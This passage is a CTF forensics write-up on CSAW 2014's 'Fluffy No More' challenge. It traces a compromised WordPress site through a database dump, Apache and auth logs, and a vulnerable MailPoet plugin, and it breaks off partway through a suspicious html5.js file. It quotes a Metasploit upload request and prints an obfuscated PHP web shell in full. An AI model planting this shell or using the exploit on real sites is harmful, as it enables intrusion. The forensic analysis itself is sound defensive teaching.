
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>CSAW 2014: Fluffy No More - The Swappage Playground</title>
  <meta name="author" content="Swappage">

  
  <meta name="description" content="The CSAW CTF 2014 wasn&rsquo;t only exploitation and reverse engineering, within the challenges a whole category was focused on forensics puzzles. &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://swappage.github.io/blog/2014/09/28/csaw-2014-fluffy-no-more">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="The Swappage Playground" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">The Swappage Playground</a></h1>
  
    <h2>Because in the end, what does matter is having fun.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:swappage.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">CSAW 2014: Fluffy No More</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-09-28T16:44:18+02:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>4:44 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>The CSAW CTF 2014 wasn&rsquo;t only exploitation and reverse engineering, within the challenges a whole category was focused on forensics puzzles.</p>

<p>Fluffy No More was a 300 points worth challenge for which the solution could have been achieved by conducting a full scope forensics analysis of a compromised system.</p>

<p>The players were provided with an archive containing</p>

<ul>
<li>a database dump</li>
<li>the content of /var/log</li>
<li>the content of /var/www/html</li>
<li>the content of /etc</li>
</ul>


<p>All the informations were (badly imho) logically acquired from the compromised system, and the challenge was focused mostly on forensics methodology: if the player was good enaugh to understand what happened on the system, he&rsquo;d find the hidden flag.</p>

<!-- more -->


<p>First thing first, let&rsquo;s say that this is how I solved the puzzle, probably there were other easier paths, but I still decided to approach this game like it was a real case, thinking that it was the best way to not leave anything behind.</p>

<p>The fictional scenario involved a compromised wordpress blog, so as a first step, i decided that it was worth to find a clue about how the attacker compromised it.</p>

<p>I had the logs from the web server, but like in any webserver logs, when analyzing them you run through lots of false positives, and this was also the case; reason why I decided to start by looking at the database dump.</p>

<p>To make my life easier, i quickly imported the database and the blog site on a lab machine, and started looking into it:
It was a matter of no time that I could spot a comment to a blog post boasting about the will of compromising the site.</p>

<p><img class="center" src="/images/2014-09-28/comment.png"></p>

<p>I remembered that wordpress, in the comments table, has a field where the IP address of the posting user is saved, I decided to take a look at it, because i thought that it could have been useful in terms of correlations with the apache webserver logs. In most cases this is not gonna happen, you&rsquo;ll unlikely be so lucky, but I was approaching to a CTF problem, not a real world scenario, and so I decided to bet on this.</p>

<pre><code>+------------+----------------+-------------------+
| comment_ID | comment_author | comment_author_IP |
+------------+----------------+-------------------+
|          4 | Hacker         | 192.168.127.130   |
+------------+----------------+-------------------+
</code></pre>

<p>Messing with the logs at this poit was a possibility, but i decided that probably if I had more details on the wordpress installation itself, this would have helped me out more in filtering the log results.</p>

<p>I reset my instance of the blog and logged in as admin to check for the list of installed plugins, and verify if at least one of them was vulnerable.</p>

<p><img class="center" src="/images/2014-09-28/mailpoet.png"></p>

<p>Mail Poet newsletter pulled my attention as it was the only plugin that was alerting that a new version was available, so why not look in public repositories if an exploit for the installed version is available?</p>

<p>I browsed exploit-db and it resulted that a metasploit module to gain remote code execution on this specific wordpress plugin is available.</p>

<p><img class="center" src="/images/2014-09-28/edb.png"></p>

<p>By a quick look at the exploit code, it&rsquo;s possible to figure out that an attacker can upload an arbitrary payload by sending the following POST request</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">({</span>
</span><span class='line'>  <span class="s1">&#39;method&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;uri&#39;</span>      <span class="o">=&gt;</span> <span class="n">uri</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;ctype&#39;</span>    <span class="o">=&gt;</span> <span class="s2">&quot;multipart/form-data; boundary=</span><span class="si">#{</span><span class="n">data</span><span class="o">.</span><span class="n">bound</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="s1">&#39;vars_get&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="s1">&#39;page&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;wysija_campaigns&#39;</span><span class="p">,</span> <span class="s1">&#39;action&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;themes&#39;</span> <span class="p">},</span>
</span><span class='line'>  <span class="s1">&#39;data&#39;</span>     <span class="o">=&gt;</span> <span class="n">post_data</span>
</span><span class='line'><span class="p">})</span>
</span></code></pre></td></tr></table></div></figure>


<p>and if we look at the apache access log, we could find:</p>

<pre><code>192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "POST /wp-admin/admin-post.php?page=wysija_campaigns&amp;action=themes HTTP/1.1" 302 385 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
</code></pre>

<p>Ok, now let&rsquo;s see if we can find the uploaded malicious file, according to the exploit code, the call for the payload is done as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">payload_uri</span> <span class="o">=</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">target_uri</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;wp-content&#39;</span><span class="p">,</span> <span class="s1">&#39;uploads&#39;</span><span class="p">,</span> <span class="s1">&#39;wysija&#39;</span><span class="p">,</span> <span class="s1">&#39;themes&#39;</span><span class="p">,</span> <span class="n">theme_name</span><span class="p">,</span> <span class="n">payload_name</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>so by grepping the logs again we could find</p>

<pre><code>192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "GET /wp-content/uploads/wysija/themes/weblizer/template.php HTTP/1.1" 200 165 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
</code></pre>

<p>Let&rsquo;s give a look at this file, it&rsquo;s most likely gonna be malicious, and in fact</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$hije</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;ey&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;seyteyrey_reyeeypleyaeyceye&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$andp</span><span class="o">=</span><span class="s2">&quot;JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$rhhm</span><span class="o">=</span><span class="s2">&quot;nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$pvqw</span><span class="o">=</span><span class="s2">&quot;GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$wfrm</span><span class="o">=</span><span class="s2">&quot;bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$vyoh</span> <span class="o">=</span> <span class="nv">$hije</span><span class="p">(</span><span class="s2">&quot;n&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;nbnansne64n_ndnecode&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$bpzy</span> <span class="o">=</span> <span class="nv">$hije</span><span class="p">(</span><span class="s2">&quot;z&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;zczreaztzez_zfzuznzcztzizon&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$xhju</span> <span class="o">=</span> <span class="nv">$bpzy</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$vyoh</span><span class="p">(</span><span class="nv">$hije</span><span class="p">(</span><span class="s2">&quot;sq&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$andp</span><span class="o">.</span><span class="nv">$pvqw</span><span class="o">.</span><span class="nv">$wfrm</span><span class="o">.</span><span class="nv">$rhhm</span><span class="p">)));</span> <span class="nv">$xhju</span><span class="p">();</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This is definitely a web shell, and by looking at it, it&rsquo;s most likely a weevely web shell: weevely web shell is evil to investigate, because it doesn&rsquo;t use get or post parameters to send commands, but as opposite it uses cookies, which are not logged in the webserver logs.</p>

<p>So from now on, understanding what happened was a real deal.</p>

<p>The attacker managed to obtain remote code execution on the server, but what would an attacker do from there on?</p>

<p>It&rsquo;s fair to assume that he might have tried to maintain access on the server, and potentially to install backdoors or spread malwares using the site; I was at a dead end tho, I couldn&rsquo;t follow a logical step forward anymore, so what i was left to do was to look at the logs with a greedy approach to see if i could find something interesting.</p>

<p>And it was while i was looking at /var/log/auth.log that I noticed a bunch of weird sudo activities by the ubuntu user using sudo.</p>

<pre><code>Sep 17 19:18:45 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chgrp -R www-data /var/www/
Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:18:53 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chmod -R 775 /var/www/
Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
Sep 17 19:20:09 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
Sep 17 19:20:22 ubuntu sudo: pam_unix(sudo:session): session closed for user root
Sep 17 19:20:55 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/find /var/www/html/ * touch {}
</code></pre>

<p>what was going on here? why would the administrator tamper timestamps that badly? and most importantly, what was that vi on /var/www/html/wp-content/themes/twentythirteen/js/html5.js ?</p>

<p>Giving a quick look at that file revealed something extremely suspicious: the file looked like an obfuscated javascript:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">l</span><span class="p">,</span> <span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">m</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">elements</span><span class="p">;</span>
</span><span class='line'>      <span class="k">return</span> <span class="s2">&quot;string&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">a</span> <span class="o">?</span> <span class="nx">a</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">a</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">[</span><span class="nx">o</span><span class="p">]];</span>
</span><span class='line'>      <span class="nx">b</span> <span class="o">||</span> <span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="p">{},</span> <span class="nx">h</span><span class="o">++</span><span class="p">,</span> <span class="nx">a</span><span class="p">[</span><span class="nx">o</span><span class="p">]</span> <span class="o">=</span> <span class="nx">h</span><span class="p">,</span> <span class="nx">n</span><span class="p">[</span><span class="nx">h</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">b</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">p</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">b</span> <span class="o">||</span> <span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">f</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nx">g</span><span class="p">)</span> <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">c</span> <span class="o">||</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="nx">i</span><span class="p">(</span><span class="nx">b</span><span class="p">));</span>
</span><span class='line'>      <span class="nx">b</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">?</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">a</span><span class="p">].</span><span class="nx">cloneNode</span><span class="p">()</span> <span class="o">:</span> <span class="nx">r</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">a</span><span class="p">)).</span><span class="nx">cloneNode</span><span class="p">()</span> <span class="o">:</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">canHaveChildren</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">s</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">?</span> <span class="nx">c</span><span class="p">.</span><span class="nx">frag</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="o">:</span> <span class="nx">b</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">t</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">cache</span><span class="p">)</span> <span class="nx">b</span><span class="p">.</span><span class="nx">cache</span> <span class="o">=</span> <span class="p">{},</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createElem</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">createElement</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createFrag</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">createDocumentFragment</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createFrag</span><span class="p">();</span>
</span><span class='line'>      <span class="nx">a</span><span class="p">.</span><span class="nx">createElement</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">return</span> <span class="o">!</span><span class="nx">e</span><span class="p">.</span><span class="nx">shivMethods</span> <span class="o">?</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">:</span> <span class="nx">p</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span>
</span><span class='line'>      <span class="p">};</span>
</span><span class='line'>      <span class="nx">a</span><span class="p">.</span><span class="nx">createDocumentFragment</span> <span class="o">=</span> <span class="nb">Function</span><span class="p">(</span><span class="s2">&quot;h,f&quot;</span><span class="p">,</span> <span class="s2">&quot;return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&amp;&amp;(&quot;</span> <span class="o">+</span> <span class="nx">m</span><span class="p">().</span><span class="nx">join</span><span class="p">().</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[\w\-]+/g</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">b</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>          <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>          <span class="k">return</span> <span class="s1">&#39;c(&quot;&#39;</span> <span class="o">+</span> <span class="nx">a</span> <span class="o">+</span> <span class="s1">&#39;&quot;)&#39;</span>
</span><span class='line'>      <span class="p">})</span> <span class="o">+</span> <span class="s2">&quot;);return n}&quot;</span><span class="p">)(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">q</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">a</span> <span class="o">||</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">f</span><span class="p">);</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">shivCSS</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">j</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">hasCSS</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="kd">var</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">a</span><span class="p">;</span>
</span><span class='line'>          <span class="nx">c</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="nx">d</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&quot;head&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">||</span> <span class="nx">d</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">;</span>
</span><span class='line'>          <span class="nx">c</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;x&lt;style&gt;article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}mark{background:#FF0;color:#000}template{display:none}&lt;/style&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>          <span class="nx">c</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">lastChild</span><span class="p">,</span> <span class="nx">d</span><span class="p">.</span><span class="nx">firstChild</span><span class="p">);</span>
</span><span class='line'>          <span class="nx">b</span><span class="p">.</span><span class="nx">hasCSS</span> <span class="o">=</span> <span class="o">!!</span><span class="nx">c</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="nx">g</span> <span class="o">||</span> <span class="nx">t</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">a</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">l</span><span class="p">.</span><span class="nx">html5</span> <span class="o">||</span> <span class="p">{},</span>
</span><span class='line'>      <span class="nx">s</span> <span class="o">=</span> <span class="sr">/^&lt;|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">r</span> <span class="o">=</span> <span class="sr">/^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">j</span><span class="p">,</span> <span class="nx">o</span> <span class="o">=</span> <span class="s2">&quot;_html5shiv&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">h</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">n</span> <span class="o">=</span> <span class="p">{},</span>
</span><span class='line'>      <span class="nx">g</span><span class="p">;</span>
</span><span class='line'>  <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">try</span> <span class="p">{</span>
</span><span class='line'>          <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="nx">a</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;&lt;xyz&gt;&lt;/xyz&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>          <span class="nx">j</span> <span class="o">=</span> <span class="s2">&quot;hidden&quot;</span> <span class="k">in</span> <span class="nx">a</span><span class="p">;</span>
</span><span class='line'>          <span class="kd">var</span> <span class="nx">b</span><span class="p">;</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">==</span> <span class="nx">a</span><span class="p">.</span><span class="nx">childNodes</span><span class="p">.</span><span class="nx">length</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>              <span class="nx">f</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
</span><span class='line'>              <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">createDocumentFragment</span><span class="p">();</span>
